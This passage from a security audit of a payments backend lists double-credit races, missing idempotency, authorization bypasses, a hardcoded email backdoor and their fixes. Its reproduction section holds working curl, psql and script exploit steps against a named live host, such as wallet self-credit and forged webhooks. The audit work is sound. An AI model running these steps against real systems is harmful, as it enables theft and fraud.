- **Fix:** Wrap entire critical section in `strapi.db.transaction`. `knex('user_wallets').where({id}).forUpdate().transacting(trx)` before reading mainBalance. Move OTP read+clear into the same trx with atomic UPDATE...WHERE otp=$1 RETURNING. Optional: unique partial index on (publisher, amount, method, recent createdAt) for DB-level dedup.
- **Effort:** M — **Regression risk:** medium — **Reverify of T7:** **REGRESSED**

### H8 — PayPal handlePaymentCompleted is non-atomic; concurrent retries double-credit
- **ID:** dev2-10, race-8, qa2-... , dev-cron-4
- **Class:** missing_idempotency / double_credit
- **File:** `src/api/transaction/controllers/paypal-webhook.js:106-242`
- **Risk:** findOne by gatewayTransactionId (line 179) → wallet read (192) → wallet update (197-203) → transaction.create (208-235). No strapi.db.transaction, no forUpdate. No DB unique constraint on gatewayTransactionId (schema declares required:true but not unique). PayPal retries on 5xx/timeout. Two concurrent deliveries both see existingTransaction=null, both credit wallet, both insert transaction rows. Razorpay does this correctly (lines 99-119 with forUpdate); PayPal does not.
- **Fix:** Wrap in strapi.db.transaction. SELECT FOR UPDATE on transactions WHERE gatewayTransactionId=capture.id BEFORE the existence check. SELECT FOR UPDATE on user_wallets. Add DB unique index on (gateway, gateway_transaction_id).
- **Effort:** M — **Regression risk:** low

### H9 — Razorpay verifyPayment + manualUpdate + cleanupPending bypass row lock; race with webhook double-credits
- **ID:** dev2-9, race-7
- **Class:** double_credit / missing_tx_boundary
- **File:** `src/api/transaction/controllers/razorpay-webhook.js:397-799`
- **Risk:** Three paths bypass the forUpdate lock that handlePaymentCaptured uses. verifyPayment (auth:false per T13) reads tx, calls Razorpay API (~500ms network), then calls updateTransactionStatus which checks the in-memory stale `previousStatus !== 'success'` — concurrent webhook can commit success in the meantime, verify proceeds and credits again. manualUpdate has NO previousStatus check at all. cleanupPendingTransactions (auth:false) iterates with the same unsafe pattern.
- **Fix:** Refactor updateTransactionStatus to accept trx + use forUpdate. Wrap each caller in db.transaction + lock. Re-read status inside the lock before crediting. Gate verifyPayment behind auth + caller-tx ownership.
- **Effort:** M — **Regression risk:** medium — **Reverify of T13:** **REGRESSED**

### H10 — Razorpay verifyPayment (auth:false) can permanently brick victim's pending tx via 5 attempts
- **ID:** authz-11
- **Class:** missing_tx_boundary / DoS
- **File:** `src/api/transaction/controllers/razorpay-webhook.js:397-608`
- **Risk:** Unauthenticated. Handler increments `verificationAttempts` (line 449-457); after 5 attempts marks tx 'failed' (lines 426-446) regardless of actual Razorpay state. If Razorpay returns zero payments (user hasn't completed yet), marks 'failed' on FIRST call (lines 482-497). Attacker enumerates pending order_ids and bricks them with 5 hits each.
- **Fix:** Require auth; bind to caller (`transaction.users_permissions_user === ctx.state.user.id`). Apply per-IP rate-limit. Move attempt counter inside a transaction with lock.
- **Effort:** M — **Regression risk:** medium

### H11 — Admin updateStatus bypasses money flow for rejected/cancelled — escrow stuck
- **ID:** dev4-8, qa-pay-9, qa2-2, authz-6, race-14
- **Class:** escrow_bypass / missing_tx_boundary
- **File:** `src/api/admin/controllers/orders.js:157-251`
- **Risk:** Only orderStatus='completed' routes through `service.completeOrder`. For 'rejected'/'cancelled' (and any other status), the else branch (lines 213-251) does a bare `entityService.update` flipping orderStatus with no escrow refund, no audit log. Inline TODO at lines 174-178 admits the gap. Worse: after admin sets 'cancelled' via this endpoint, the legitimate `/admin/orders/:id/cancel` endpoint refuses with "Order is already cancelled" (line 436) — recovery path closed.
- **Fix:** Delegate 'rejected' to `service.rejectOrder`, 'cancelled' to `service.cancelOrderAtomic({cancelledBy:'admin', actorUserId})`. Refuse direct admin status flips for terminal money-impacting states. Use forUpdate on the orders row.
- **Effort:** M — **Regression risk:** medium — **Reverify of M4:** **STILL OPEN**

### H12 — Admin cancelOrder uses non-atomic refund→status pattern (M7 regression in admin path)
- **ID:** qa2-2
- **Class:** missing_tx_boundary
- **File:** `src/api/admin/controllers/orders.js:419-510`
- **Risk:** Admin cancelOrder calls `refundEscrowToAdvertiser` OUTSIDE db.transaction (line 452), then separately updates status (line 460). Failure between refund commit and status update leaves order in inconsistent state. User-facing cancelOrder uses cancelOrderAtomic correctly; admin path was overlooked.
- **Fix:** Replace lines 446-490 with `strapi.service('api::order.order').cancelOrderAtomic(id, {cancelledBy:'admin', reason, actorUserId})`. Handle alreadyTerminal sentinel as 400.
- **Effort:** S — **Regression risk:** low — **Reverify of M4 sibling:** **REGRESSED**

### H13 — Stripe handleChargeRefunded has no idempotency — webhook retries double-debit
- **ID:** dev2-7, race-12, qa2-10
- **Class:** double_refund / missing_idempotency
- **File:** `src/api/transaction/controllers/stripe-webhook.js:529-589` (cited 627-687, off by ~100)
- **Risk:** Looks up original tx by payment_intent id, then creates a new refund tx with charge.id (no pre-existence check on charge.id), decrements wallet.mainBalance. No DB unique constraint on gatewayTransactionId. Stripe retries on 5xx + manual dashboard replay is a common ops action. Two invocations → 2 refund rows, wallet double-debited. Math.max(0,...) only floors, doesn't prevent.
- **Fix:** Before create, `findOne({where:{type:'refund', gatewayTransactionId: charge.id, gateway:'stripe'}})` — return early if exists. Wrap in db.transaction with forUpdate on wallet.
- **Effort:** S — **Regression risk:** low

### H14 — deliverOrder controller bypasses service, no row-lock, allows pending→delivered fast-path
- **ID:** dev4-7, qa-pay-2, race-6
- **Class:** race_condition
- **File:** `src/api/order/controllers/order.js:1593-1817`
- **Risk:** Controller-level deliverOrder does its own db.query reads/writes instead of calling service.deliverOrder(). Flips pending→accepted inline (1729-1741) then to delivered (1804-1817). 4+ separate queries, no SELECT FOR UPDATE. Concurrent deliver + cancelOrderAtomic from cron can leave order 'delivered' with $0 escrow. Skips `acceptOrder` notification on pending→delivered jump.
- **Fix:** Delete inline logic, call `strapi.service('api::order.order').deliverOrder(id, user, body)`. Service should add row-lock + transaction. Forbid pending→delivered fast-path.
- **Effort:** M — **Regression risk:** medium — **Reverify of T8:** **REGRESSED**

### H15 — Admin manual-update-razorpay duplicate flow + admin/withdrawals.pay() writes invalid schema fields
- **ID:** dev4-6, sec2-pay-8
- **Class:** enum_mismatch / missing_tx_boundary
- **File:** `src/api/admin/controllers/withdrawals.js:310-369`
- **Risk:** pay() handler creates transaction with `transactionType` (not in schema; field is `type`), `transactionStatus:'completed'` (not in enum: enum has success|paid not completed), `paymentGateway` (field is `gateway`), missing required `netAmount, gateway, gatewayTransactionId, users_permissions_user`. Status flips to 'paid' first (triggering pendingWithdrawalBalance reduction via lifecycle), then transaction.create throws on validation — wallet state mutated but no audit row.
- **Fix:** Delete the pay() handler entirely (verify no route wired). Use markAsPaid only. If pay() must remain, fix schema field names + wrap in db.transaction with forUpdate.
- **Effort:** S — **Regression risk:** low — **Reverify of T4:** **REGRESSED**

### H16 — Withdrawal admin lookup uses unanchored `$contains 'Withdrawal request'` — touches wrong tx
- **ID:** dev4-5, qa-pay-5 (component)
- **Class:** double_credit / forensic_gap
- **File:** `src/api/withdrawal-request/controllers/withdrawal-request.js:712-731, 896-915`
- **Risk:** Both deny and markPaid lookup transactions with `description: { $contains: 'Withdrawal request' }` — no id, no orderBy, no FK. Publisher with multiple pending withdrawals: admin paying #5 may flip tx for #50 instead, leading to status drift. Lifecycle handlers use `#${id}` but no word boundary, so #5 matches #50/#51/#500.
- **Fix:** Add `withdrawal_request` relation on transaction schema. Query by FK id. Use orderBy id desc + exact-match disambiguation as belt-and-suspenders.
- **Effort:** S — **Regression risk:** low — **Reverify of T2:** **REGRESSED**

### H17 — PhonePe webhook signature compare not constant-time; expectedChargeCents check absent
- **ID:** dev2-15, sec3-8
- **Class:** payment_tampering
- **File:** `src/api/transaction/services/phonepe.js:41-46` + `controllers/phonepe-webhook.js:75-78`
- **Risk:** `verifySignature` uses `===` string compare. M11 cross-check missing entirely from PhonePe (M11 fix shipped for Stripe/Razorpay/PayPal only). If salt key leaks via log scraping (see dev-env-10 — logs the full saltKey on init), forged callback credits arbitrary amount.
- **Fix:** crypto.timingSafeEqual on truncated buffers. Add expectedChargeCents comparison against transaction.metadata.expectedChargeCents.
- **Effort:** S — **Regression risk:** low — **Reverify of M11:** partially_fixed

### H18 — `/api/wallet/add-promo-funds` adds caller-supplied amount with no promo code validation
- **ID:** sec2-pay-3
- **Class:** balance_inflation / mass_assignment
- **File:** `src/api/user-wallet/controllers/wallet.js:264-300`
- **Risk:** POST accepts `{amount, promoCodeId}`. addPromoFunds directly adds amount to promoBalance + balance with no validation that promoCodeId is real/unused/owned. Pure free-money primitive. Today mitigated only by runtime DB permission revocation (2026-05-23 migration). Scope mismatch: route declares `api::user-wallet.user-wallet.addPromoFunds`, handler is `wallet.addPromoFunds` (different namespace), which one verifier showed actually causes 403 in production today — but the fragile config and code-level absence of validation makes this critical to fix.
- **Fix:** Require valid promoCode string, lookup with row-lock, validate, mark used, then add the promo's actual amount. Or delete the endpoint (redeem-promo does this correctly). Fix route scope to match handler.
- **Effort:** S — **Regression risk:** low

### H19 — PayPal payout webhook handlers are no-ops; failed payouts never reverse wallet debit
- **ID:** dev2-11
- **Class:** forensic_gap / money_theft
- **File:** `src/api/transaction/controllers/paypal-webhook.js:517-543`
- **Risk:** `handlePayoutCompleted` and `handlePayoutFailed` only `console.log`. When PayPal returns `PAYOUTS.PAYOUT.FAILED` (recipient unregistered, KYC bounce, insufficient sender), withdrawal stays 'paid' in DB and publisher's wallet stays debited — publisher loses money with no payout, no refund, no audit.
- **Fix:** Implement handlePayoutFailed: lookup withdrawal by sender_item_id, db.transaction + forUpdate, re-credit publisher mainBalance, set withdrawal status 'failed', write compensating transaction. Implement handlePayoutCompleted: mark withdrawal 'paid_confirmed' with ledger entry.
- **Effort:** L — **Regression risk:** medium

### H20 — Withdrawal lifecycle handler is unanchored; word-boundary collision on `#5` vs `#50`
- **ID:** dev4-5 (component), dev-cron-10
- **Class:** double_credit / forensic_gap
- **File:** `src/api/withdrawal-request/content-types/withdrawal-request/lifecycles.js:244-262`
- **Risk:** `handleDeniedWithdrawal` blindly creates new refund tx each fire, gatewayTransactionId=`REFUND_WR_${id}_${Date.now()}` so unique each time, no dedup. Couples with C8.
- **Fix:** Same as C8 — add refundedAt timestamp, idempotency check inside FOR UPDATE.
- **Effort:** S — **Regression risk:** low

### H21 — No webhook event-id deduplication across any gateway
- **ID:** dev2-12, sec3-3
- **Class:** missing_idempotency
- **File:** stripe-webhook.js:55-101, paypal-webhook.js:51-72, razorpay-webhook.js:61-74, phonepe-webhook.js:13-86
- **Risk:** No gateway stores received `event.id` / `transmission_id` / `event_id` / merchant_tx in dedup table. Idempotency relies solely on tx status check, which fails for events that don't flip transactionStatus (refunds, failures, payouts). Replays cause duplicate failure emails, multiple refund rows, repeated state transitions.
- **Fix:** Add `webhook_event_log(event_id PK, gateway, received_at)`. INSERT ON CONFLICT DO NOTHING at handler entry; if no rows, return 200 silently.
- **Effort:** M — **Regression risk:** low

### H22 — Razorpay `===` signature compare not constant-time
- **ID:** dev2-14, sec3-8 (component)
- **Class:** payment_tampering
- **File:** `src/api/transaction/controllers/razorpay-webhook.js:51-57`
- **Risk:** Comment claims "prevents timing attacks" but uses string `!==`. Combined with H2 JSON re-serialization, broken multiple ways. Network timing attacks impractical but industry-standard correctness fix.
- **Fix:** `crypto.timingSafeEqual(Buffer.from(expected,'hex'), Buffer.from(received,'hex'))`. Wrap in try/catch for length mismatch.
- **Effort:** S — **Regression risk:** low — **Reverify of M12:** **REGRESSED**

### H23 — No DB unique constraint on `(gateway, gatewayTransactionId)` — webhook retries can double-credit
- **ID:** qa4-schema-5
- **Class:** balance_inflation / missing_idempotency
- **File:** `src/api/transaction/content-types/transaction/schema.json:62-65`
- **Risk:** gatewayTransactionId is required:true but not unique. No migration adds compound unique index. Webhook handlers find existing by gatewayTransactionId alone — application-level dedup only. PayPal/PhonePe handlers can race-create duplicate rows.
- **Fix:** Migration: `CREATE UNIQUE INDEX transactions_gateway_txid_uniq ON transactions(gateway, gateway_transaction_id) WHERE gateway_transaction_id IS NOT NULL`. Mark unique:true in schema. Catch unique-violation in webhook code and treat as idempotent.
- **Effort:** M — **Regression risk:** medium

### H24 — No DB unique constraint on user-wallet.users_permissions_user — race creates duplicate wallets
- **ID:** qa4-schema-6
- **Class:** balance_inflation / forensic_gap
- **File:** `src/api/user-wallet/content-types/user-wallet/schema.json:66-71`
- **Risk:** oneToOne but no DB-level uniqueness. Strapi join-table has composite unique only on (wallet_id, user_id), not preventing multiple wallets per user. getOrCreateWallet uses findOne+create with no lock. Live DB inspection shows 18 of 38 users have no wallet row — first balance/order request triggers create; two parallel calls produce duplicates. Subsequent findOne returns first; deposits land in wallet#1, withdrawals from wallet#2. ensureSingleWallet cleanup omits mainBalance/promoBalance → fund loss on consolidation.
- **Fix:** `CREATE UNIQUE INDEX user_wallets_user_uniq ON user_wallets_users_permissions_user_lnk(user_id)`. Convert getOrCreateWallet to use ON CONFLICT or advisory lock.
- **Effort:** M — **Regression risk:** medium

### H25 — Withdrawal create mutates wallet outside any transaction; no structured event log
- **ID:** dev-obs-8
- **Class:** forensic_gap
- **File:** `src/api/withdrawal-request/controllers/withdrawal-request.js:349-446`
- **Risk:** Withdrawal-request row + transaction row + wallet mutate all outside any db.transaction. If wallet update fails, withdrawal_request + transaction orphaned. console.log only, no structured event line, no admin-audit-log row for user-initiated withdrawals.
- **Fix:** Wrap in db.transaction (folds with H7). strapi.log.info({event:'withdrawal_created', ...userContext}). Add admin-audit-log row with action:'withdrawal_self_request'.
- **Effort:** M — **Regression risk:** medium — **Reverify of T7:** new_evidence

### H26 — M10 still open: order-audit-log only fires for cancel; accept/deliver/complete/reject/dispute unlogged
- **ID:** dev4-10, dev-obs-1, qa-pay-10, qa4-schema-12
- **Class:** forensic_gap
- **File:** `src/api/order/services/order.js:1077-1098` (single caller at 1065)
- **Risk:** Cannot answer "who completed order #N at time T and where did the money go". completeOrder credits publisher + decrements advertiser escrow but writes NO audit-log row.
- **Fix:** Call createAuditLog inside acceptOrder, deliverOrder, completeOrder, rejectOrder, refundEscrowToAdvertiser, disputeOrder, requestRevision — inside each tx. Include actor userId, IP, userAgent, previousStatus, newStatus, money delta.
- **Effort:** M — **Regression risk:** low — **Reverify of M10:** **STILL OPEN**

### H27 — Admin withdrawal lifecycle writes zero admin-audit-log rows
- **ID:** dev-obs-2
- **Class:** forensic_gap
- **File:** `src/api/admin/controllers/withdrawals.js:149-524`, `src/api/withdrawal-request/controllers/withdrawal-request.js:546-979`
- **Risk:** Every admin pay/deny releases or refunds money but writes only console.log — no IP, no userAgent, no before/after balance, no paymentReference. Compare with admin/wallets.js createTransaction:572 which DOES write the row.
- **Fix:** Add `strapi.entityService.create('api::admin-audit-log.admin-audit-log', {...})` at the end of every approve/reject/pay/markAsPaid/denyWithdrawal/approveWithdrawal/markAsPaidWithdrawal. Wrap in try/catch.
- **Effort:** S — **Regression risk:** low

### H28 — Admin updateWalletBalance writes audit only when reason+delta non-zero; silent rewrites invisible
- **ID:** dev-obs-3
- **Class:** forensic_gap
- **File:** `src/api/admin/controllers/wallets.js:326-415`
- **Risk:** Skips admin-audit-log when reason empty OR creditDelta===0. Admin can zero out promoBalance + credit mainBalance by same amount (delta=0) with no paper trail.
- **Fix:** Move audit-log outside the conditional. Always write {prevMain, prevPromo, nextMain, nextPromo, mainDelta, promoDelta, reason, walletId, ip, userAgent}.
- **Effort:** S — **Regression risk:** low

### H29 — Bank-transfer completion writes invalid transaction (M10 + T1 surface) and skips audit log
- **ID:** dev-obs-4 (component)
- **Class:** enum_mismatch / forensic_gap
- **File:** `src/api/bank-transfer-request/controllers/bank-transfer-request.js:203-235`
- **Risk:** Folds with C7. No admin-audit-log row. Same pattern as withdrawal markAsPaid (H15).
- **Fix:** (See C7 fix) + add admin-audit-log on completion path.
- **Effort:** S — **Regression risk:** medium

### H30 — getMyWithdrawals merges client filters AFTER baseFilters; client overrides `publisher` to read victim's withdrawals
- **ID:** authz-3
- **Class:** data_leak / authz_bypass
- **File:** `src/api/withdrawal-request/controllers/withdrawal-request.js:462-541`
- **Risk:** Lines 487-491 iterate `queryFilters` and unconditionally overwrite `combinedFilters[key] = queryFilters[key]`. Attacker: `GET /withdrawal-requests/my?filters[publisher][id][$eq]=<victim>` drops the user-bound base filter. Returns victim's withdrawal records including amount, method, bank/PayPal details JSON, denial reasons. Cross-tenant PII + payout-detail leak.
- **Repro:** Live: `GET /api/withdrawal-requests/my?filters[publisher][id][$eq]=42` with any JWT.
- **Fix:** Apply user-filters first, then `combinedFilters = { ...queryFilters, publisher:{id:userId} }` so base wins. Add allowlist of permitted filter keys.
- **Effort:** S — **Regression risk:** low

---

## MEDIUM FINDINGS (compressed)

- **M-01 dev-pay-8 / qa-pay-11 / qa2-7 / authz-5 / dev-obs-9 / sec2-pay-12** — Public GET /api/transactions/status/:id leaks amount/currency/invoice/PDF URL; duplicate /api/api/... typo'd route doubles surface; also falls through to Stripe API lookup for unknown ids. **Reverify T11: STILL OPEN.** Fix: require JWT + ownership check + remove fallback.
- **M-02 dev-pay-10** — Rate-limit query miscounts when userId undefined (dev-mode unauth branch). Fix: delete dev-mode branch.
- **M-03 dev2-7 / qa2-10 (component)** — Stripe handleChargeRefunded — see H13.
- **M-04 dev2-8 / qa2-9** — PayPal handlePaymentRefunded — see C14.
- **M-05 dev2-12 / sec3-3** — Webhook event-id dedup absent — see H21.
- **M-06 dev2-13 / sec3-9** — Stripe NODE_ENV=development bypass reconstructs raw body and skips signature verify. Fix: delete dev bypass entirely; require Symbol.for('unparsedBody').
- **M-07 dev2-16 / qa2-14 / sec2-pay-1** — see C9.
- **M-08 dev4-9** — denyWithdrawal writes `denialReason` (camelCase) but schema column is `denial_reason` — silently dropped. Fix: rename in update payload.
- **M-09 dev4-11** — OTP race: two parallel POSTs with same OTP both pass before clearOtp commits. Fix: atomic UPDATE...WHERE withdrawalOtp=$1 RETURNING.
- **M-10 dev-obs-5** — PII leak: createPayment logs full wallet object every payment request. Fix: structured log with walletId only.
- **M-11 dev-obs-6** — M11 BASEAMOUNT_TAMPER log lacks request-id, UA, walletId; WARN level + string format. Fix: structured ERROR with full context.
- **M-12 dev-obs-7** — Webhook signature/amount-mismatch share log prefix with success events; cannot wire fraud alerts. Fix: structured event tags (webhook_signature_fail, webhook_amount_mismatch, webhook_replay_detected).
- **M-13 dev-obs-10** — Withdrawal lifecycle mutates wallet with no structured event + no admin-audit-log row. Fix: structured logging + audit row + transaction wrap.
- **M-14 dev-env-6** — Fee/GST/FX-rate fallbacks silently apply on missing env vars; config drift between computeFees and getFeeConfig. Fix: throw at boot, remove USD_TO_INR_RATE fallback, single source of truth.
- **M-15 dev-env-7** — JWT_SECRET hardcoded fallback `'your-secret-key-here'` in plugins.js. Fix: `env('JWT_SECRET')` no fallback.
- **M-16 dev-env-8** — CLERK_JWT_ISSUER optional; issuer claim not verified when env missing. Fix: throw at boot.
- **M-17 dev-env-9** — No fail-closed-at-boot on money-flow secrets. Fix: assertions block in src/index.js bootstrap.
- **M-18 dev-cron-7** — No cron auto-expires stale pending Stripe/PayPal/PhonePe transactions; ghost rows accumulate. Fix: scheduled job every 15min reconciles with gateway API.
- **M-19 dev-cron-8** — Amount-mismatch failed transactions log to console only; no PagerDuty/Slack/email alerts. Fix: raiseFraudAlert helper.
- **M-20 dev-cron-9** — createPendingTransaction check-then-create race; no DB unique constraint. Fix: add unique + catch violation. Folds with H4 / H23.
- **M-21 dev-cron-10** — Lifecycle blindly creates new refund tx on every afterUpdate fire. Fix: idempotency flag.
- **M-22 dev-cron-11** — Cron auto-cancellation has no persistent-failure escalation. Fix: counter + dead-letter table.
- **M-23 sec2-pay-10** — Razorpay HMAC over JSON.stringify(body) — see H2 / M12.
- **M-24 qa-pay-13** — Platform-fee tx has no user_wallet relation; orphan ledger row. Fix: attach to system wallet or publisher wallet; skip creating when amount=0.
- **M-25 qa-pay-14** — Stripe webhook handlePaymentSucceeded sends no success email or in-app notification on wallet credit. Fix: call sendPaymentConfirmationEmail + createPaymentNotification.
- **M-26 qa2-6** — disputeOrder freezes status only; no escrow lock, no admin notification, 'disputed' missing from TERMINAL_STATUSES. Fix: add to terminal set; require dispute resolution path.
- **M-27 qa2-11** — withdrawal-request schema lacks 'failed'/'reversed' enum; markAsPaidWithdrawal silently overrides payment_result failure to success. Fix: add enum values; honor paymentResult.success.
- **M-28 qa2-12** — Missing revisionCount; unlimited revision griefing. **Reverify of M9: STILL OPEN.** Fix: revisionCount field, MAX_REVISIONS=3.
- **M-29 qa2-13** — verifyPayPalPayment manual path TOCTOU on dedup; no expectedChargeCents check. Fix: db.transaction + lock; mirror webhook M11.
- **M-30 qa4-schema-7** — transaction.user_wallet + users_permissions_user not required; orphan rows possible. Fix: required:true; beforeCreate derive.
- **M-31 qa4-schema-8** — withdrawal-request.publisher not required. Fix: required:true.
- **M-32 qa4-schema-9** — bank-transfer-request.userId is bare integer with no FK enforcement; trio invites tampering. Fix: convert to manyToOne relation; drop userEmail/userName.
- **M-33 qa4-schema-10** — Transaction schema lacks currency field; historical rows lose meaning. Fix: add currency + exchangeRate.
- **M-34 qa4-schema-11** — Default amount:0 min:0 allows webhook-failure rows to mask audits. Fix: lifecycle beforeCreate gating.
- **M-35 race-11** — Admin tx edit uses stale read. Fix: db.transaction + lock.
- **M-36 race-13** — Generic /webhook/:gateway handler no row lock — see C9.
- **M-37 race-14** — Admin updateStatus rejected/cancelled bypass — see H11.
- **M-38 authz-7** — Stripe markTransactionFailed handler missing ownership/admin check. Fix: defense-in-depth role check.
- **M-39 authz-8** — Stripe checkTransactionStatus updates wallet by any pi_xxx with no ownership check. Fix: require ctx.state.user owns tx.
- **M-40 authz-10** — Admin transaction approve/deny/markPaid handlers have hardcoded email backdoor `user.email === 'mantasha@wordscloud.in'`. Same in withdrawal-request handlers (3 sites). Fix: remove backdoor; use global::is-admin policy.
- **M-41 sec3-10** — Razorpay order.paid handler skips amount-mismatch warning path + falls back to orderId for external_transaction_id. Fix: symmetric handling + null fallback.
- **M-42 sec3-11** — Webhook error responses leak internal error details (error.message → caller). Fix: generic 400/500.
- **M-43 dev-obs-12 / sec2-pay-12** — Duplicate /api/api/... typo'd routes for status + webhook. Fix: remove.

---

## LOW FINDINGS

- **L-01 dev-env-10** — PhonePe service prints merchantId + full salt-key + signatures to stdout on init/per request.
- **L-02 dev-cron-12** — Razorpay handlePaymentFailed has no status guard; out-of-order webhooks can overwrite success.
- **L-03 dev-obs-11** — Cron auto-cancellation success path silent; no metrics.
- **L-04 qa-pay-13** — Platform-fee tx orphan (component of M-24).
- **L-05 qa4-schema-13** — Invoice schema has self-referential `invoice` oneToOne relation (copy-paste bug).
- **L-06 qa4-schema-14** — Order schema lacks disputeReason + revisionCount columns (covers M6 + M9).
- **L-07 qa4-schema-15** — markAsPaidWithdrawal payout writes nonexistent `withdrawal_request` field + invalid 'payoneer' gateway enum.
- **L-08 dev4-12** — Order create spendFunds outside wallet lock (covers C11).
- **L-09 sec3-12** — No persisted webhook event log.

---

## 4. Reproduction Evidence (CRITICAL/HIGH)

### Repro setup
```bash
export HOST=https://cms.serpbays.com
export JWT_ATTACKER=$(curl -s -X POST $HOST/api/auth/local \
  -d '{"identifier":"attacker@x.com","password":"Pwd1234!"}' | jq -r .jwt)
export JWT_VICTIM=$(...similar...)
```

### C1 — Currency mismatch (Stripe path)
```bash
curl -X POST $HOST/api/transactions/payment \
  -H "Authorization: Bearer $JWT_ATTACKER" -H "Content-Type: application/json" \
  -d '{"gateway":"stripe","amount":100,"baseAmount":100,"currency":"INR"}'
# → returns client_secret for a 10000-paise (100 INR ≈ $1.20) PaymentIntent
# Complete in Stripe → webhook fires
psql -c "SELECT mainBalance FROM user_wallets WHERE users_permissions_user=$ATTACKER_ID;"
# → +100 (USD)
```

### C2 — PayPal M11 no-op
```bash
curl -X POST $HOST/api/transactions/payment \
  -H "Authorization: Bearer $JWT_ATTACKER" \
  -d '{"gateway":"paypal","amount":100,"baseAmount":100,"currency":"USD"}'
# Inspect logs for the created PayPal order → grep "custom_id" → expectedChargeCents absent
# Complete order → webhook → logs show "[PAYPAL_LEGACY] expectedChargeCents missing — within grace period"
```

### C3 — verify-paypal authz bypass
```bash
# Prerequisite: discover any COMPLETED PayPal orderId (returnUrl, browser history, etc.)
curl -X POST $HOST/api/transactions/verify-paypal \
  -H "Authorization: Bearer $JWT_ATTACKER" \
  -d '{"orderId":"<COMPLETED_ORDER>","walletId":<ATTACKER_WALLET_ID>}'
psql -c "SELECT mainBalance FROM user_wallets WHERE id=$ATTACKER_WALLET;"
```

### C4 — manual-update-razorpay self-credit
```bash
curl -X POST $HOST/api/transactions/pending \
  -H "Authorization: Bearer $JWT_ATTACKER" \
  -d '{"amount":9999,"currency":"INR","gateway":"razorpay","gatewayTransactionId":"order_pwn","walletId":<self>}'
curl -X POST $HOST/api/transactions/manual-update-razorpay \
  -H "Authorization: Bearer $JWT_ATTACKER" \
  -d '{"order_id":"order_pwn","payment_id":"pay_fake","status":"success"}'
# → 200, mainBalance += 9999
```

### C5 — fix-earnings system-wide inflate
```bash
SUM_BEFORE=$(psql -tc "SELECT SUM(mainBalance) FROM user_wallets;")
curl -X POST $HOST/api/wallet/fix-earnings -H "Authorization: Bearer $JWT_ATTACKER"
SUM_AFTER=$(psql -tc "SELECT SUM(mainBalance) FROM user_wallets;")
echo "Delta: $(echo "$SUM_AFTER - $SUM_BEFORE" | bc)"
# Re-run: delta multiplies
```

### C6 — PayPal sandbox bypass
```bash
# Prerequisite: PAYPAL_ENVIRONMENT misconfigured (typo / unset / != 'live')
curl -X POST $HOST/api/transactions/paypal-webhook \
  -H "paypal-transmission-id: x" -H "paypal-transmission-time: 2026-06-16T00:00:00Z" \
  -H "paypal-cert-url: https://x" -H "paypal-auth-algo: x" -H "paypal-transmission-sig: x" \
  -d '{"event_type":"PAYMENT.CAPTURE.COMPLETED","resource":{"id":"FAKE","amount":{"value":"100","currency_code":"USD"},"supplementary_data":{"related_ids":{"order_id":"<own_sandbox_order>"}}}}'
# Service logs SANDBOX_BYPASS → handler credits attacker's wallet
```

### C7 — Bank-transfer double-credit + planted userId
```bash
curl -X POST $HOST/api/bank-transfer-requests -H "Authorization: Bearer $JWT_ATTACKER" \
  -d '{"amount":500,"referenceNumber":"REF1","transactionId":"TXN1","userId":<victim_id>,"userEmail":"a@a","userName":"x"}'
# As admin:
for i in 1 2; do
  curl -X PUT $HOST/api/bank-transfer-requests/$id -H "Authorization: Bearer $ADMIN_JWT" \
    -d '{"status":"completed"}'
done
psql -c "SELECT mainBalance FROM user_wallets WHERE users_permissions_user=$VICTIM_ID;"
# → +$1000
psql -c "SELECT count(*) FROM transactions WHERE gatewayTransactionId LIKE 'bank_%';"
# → 0 (schema validation silently dropped them)
```

### C8 — Withdrawal lifecycle double-credit on benign edit
```bash
# Admin: open denied withdrawal in Strapi admin UI, edit admin_notes, save
# Or via API:
curl -X PUT $HOST/api/admin/withdrawal-requests/$id \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"admin_notes":"clarification"}'
# afterUpdate re-fires denial handler → mainBalance += (amount + 20% fee)
```

### C9 — Generic webhook PayPal bypass
```bash
curl -X POST $HOST/api/transactions/webhook/paypal \
  -d '{"resource":{"id":"<known_approved_paypal_order>"}}'
# → captureOrder fires with no signature → pending tx → success → wallet credited
```

### C11 — spendFunds race
```javascript
const jwt = '...'; const amt = 80;
await Promise.all([
  fetch('/api/orders', {method:'POST', headers:{Authorization:`Bearer ${jwt}`,...}, body:JSON.stringify({websiteId:1, totalAmount:amt})}),
  fetch('/api/orders', {method:'POST', headers:{Authorization:`Bearer ${jwt}`,...}, body:JSON.stringify({websiteId:2, totalAmount:amt})}),
]);
// psql: mainBalance=$20, escrowBalance=$160 from $100 deposit
```

### C12 — PhonePe double-credit race
```bash
# After legitimate PhonePe payment completes
seq 1 5 | xargs -n1 -P5 -I{} curl -X POST $HOST/api/transactions/phonepe-status \
  -d '{"transactionId":"TXN_<your_id>"}'
# Wallet credited 2-5× depending on interleaving
```

### C13 — Withdrawal double-payout race
```bash
seq 1 2 | xargs -n1 -P2 -I{} curl -X POST \
  $HOST/api/admin/withdrawal-requests/$id/mark-as-paid \
  -H "Authorization: Bearer $ADMIN_JWT"
# 2 PayPal payouts fire externally; 2 payout transactions written
```

### C14 — PayPal refund double-spend
```sql
-- 1. Deposit $100 PayPal: mainBalance=100, balance=100
-- 2. Place $50 order: mainBalance=50, balance=50
-- 3. PayPal dashboard refund $100: balance=0, mainBalance=50 (unchanged)
-- 4. Place another $50 order: spendFunds checks mainBalance=50, ALLOWS
-- Net: $100 refund + $100 services delivered for $100 paid
```

### H1–H30 repros: see individual finding sections for static line references and concrete attack shapes.

---

## 5. Remediation Plan (by theme)

### Theme 1: Currency + Amount validation (M11 completion)
**Dependencies:** None. **Fixes:** C1, C2, H1, H17, M-29, H4.
- Lock allowlist on `currency` parameter in createPayment controller (USD only for Stripe/PayPal/PhonePe; INR for Razorpay).
- Symmetric guard in `computeFees`.
- Stuff `expectedChargeCents` into PayPal custom_id properly.
- Add M11 check to PhonePe webhook and the manual verify-paypal path.
- Add M11 check to createPendingTransaction (or kill the endpoint).

### Theme 2: AuthZ — admin gates + ownership checks
**Dependencies:** None. **Fixes:** C3, C4, C5, C9, H5, H6, H10, H11, H30, M-38, M-39, M-40.
- Add `policies: ['global::is-admin']` to all admin-only routes; never rely on bare `auth: { strategies: ['jwt'] }` without scope.
- Add owner checks (ctx.state.user.id === wallet.users_permissions_user) in all handlers accepting body-supplied walletId.
- Remove hardcoded email backdoor across 5 admin handlers.
- Delete `/api/wallet/fix-earnings` (or gate behind is-admin).
- Delete generic `/webhook/:gateway` routes.
- Override Strapi default create/update/delete/find on transaction + withdrawal-request collections.

### Theme 3: Concurrency — db transactions + row locks
